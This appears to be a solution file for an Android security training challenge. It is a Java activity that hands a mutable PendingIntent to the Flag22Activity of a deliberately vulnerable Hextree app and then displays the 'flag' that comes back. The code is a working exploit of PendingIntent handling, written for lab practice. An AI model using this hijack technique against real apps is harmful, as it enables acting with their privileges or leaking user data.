package com.example.practicapp;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityHextree extends AppCompatActivity {
    private int counting = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);

        // get the incoming intent
        if(getIntent().hasExtra("flag")) {
            String flag = getIntent().getStringExtra("flag");
            t1.setText( "FLAG:\n" + flag);
            return;
        }
        
        b1.setOnClickListener(v -> {
            // Send the Pending Intent 
            Intent receiveIntent = new Intent(this, MainActivityHextree.class);

            PendingIntent pendingIntent = PendingIntent.getActivity(
                    this,
                    0,
                    receiveIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
            );

            // Launch Flag22Activity
            Intent attackIntent = new Intent();
            attackIntent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag22Activity"
            );

            attackIntent.putExtra("PENDING", pendingIntent);

            startActivity(attackIntent);
        });
    }

}
